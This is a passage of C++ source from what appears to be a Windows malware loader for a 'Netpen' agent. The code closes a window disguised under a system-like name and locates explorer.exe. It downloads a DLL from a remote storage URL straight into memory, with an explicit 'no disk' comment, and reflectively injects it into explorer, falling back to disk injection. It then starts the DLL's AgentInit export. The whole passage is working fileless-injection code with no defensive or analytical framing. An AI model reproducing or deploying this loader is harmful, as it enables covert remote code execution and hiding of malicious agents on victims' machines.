        HWND hWnd = FindWindowW(L"RuntimeBrokerHiddenWindow", L"");
        if (hWnd) PostMessageW(hWnd, WM_CLOSE, 0, 0);
        for (int i = 0; i < 30; i++) {
            HANDLE hRun = OpenEventW(SYNCHRONIZE, FALSE, L"NetpenAgentRunningV2");
            if (!hRun) {
                HANDLE hOld = OpenEventW(SYNCHRONIZE, FALSE, L"NetpenAgentRunning");
                if (!hOld) { RLOG("Main: old agent exited (no events)"); break; }
                CloseHandle(hOld);
                Sleep(5000);
                break;
            }
            bool alive = (WaitForSingleObject(hRun, 0) == WAIT_OBJECT_0);
            CloseHandle(hRun);
            if (!alive) { RLOG("Main: agent exited after %ds", i + 1); break; }
            Sleep(1000);
        }
        if (hStop) CloseHandle(hStop);
    }

    HANDLE hMutex = CreateMutexW(NULL, TRUE, L"NetpenAgentInjection");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        if (hMutex) CloseHandle(hMutex);
        return 0;
    }

    DWORD pid = FindExplorerPid();
    RLOG("Main: explorer pid=%lu", pid);
    if (!pid) { RLOG("Main: no explorer pid"); if (hMutex) CloseHandle(hMutex); return 1; }

    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!hProcess) { RLOG("Main: OpenProcess %lu failed gle=%lu", pid, GetLastError()); if (hMutex) CloseHandle(hMutex); return 1; }
    RLOG("Main: process handle OK");

    // Download DLL into memory (no disk)
    std::vector<BYTE> dllBytes;
    for (int attempt = 0; attempt < 3; attempt++) {
        dllBytes = HttpDownloadToMemory(L"/storage/v1/object/public/Netpen/agent.dll");
        if (!dllBytes.empty()) break;
        RLOG("Main: download attempt %d failed, size=%zu", attempt + 1, dllBytes.size());
        if (attempt < 2) Sleep(2000);
        else { RLOG("Main: all download attempts failed"); CloseHandle(hProcess); if (hMutex) CloseHandle(hMutex); return 1; }
    }
    RLOG("Main: download OK size=%zu", dllBytes.size());

    // Try reflective injection first, fall back to disk-based LoadLibraryW
    ULONGLONG dllBase = 0;
    bool injected = ReflectiveInject(hProcess, dllBytes.data(), dllBytes.size(), &dllBase);
    if (injected) RLOG("Main: reflective inject OK base=%llx", dllBase);
    else {
        RLOG("Main: reflective failed, trying disk inject");
        injected = DiskInject(hProcess, dllBytes.data(), dllBytes.size(), &dllBase);
        if (injected) RLOG("Main: disk inject OK base=%llx", dllBase);
    }

    if (!injected) { RLOG("Main: all injection methods failed"); CloseHandle(hProcess); if (hMutex) CloseHandle(hMutex); return 1; }

    // Get AgentInit RVA from local DLL data
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dllBytes.data();
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(dllBytes.data() + dos->e_lfanew);
    DWORD initRva = GetExportRva(dllBytes.data(), nt, "AgentInit");
    RLOG("Main: AgentInit RVA=%08x", initRva);

    bool agentStarted = false;
    if (initRva) agentStarted = StartAgentInit(hProcess, dllBase, initRva);
    RLOG("Main: agentStarted=%d", (int)agentStarted);

    CloseHandle(hProcess);
    if (hMutex) CloseHandle(hMutex);

    if (agentStarted && remoteVer > 0) SetStoredVersion(remoteVer);
    return 0;
}
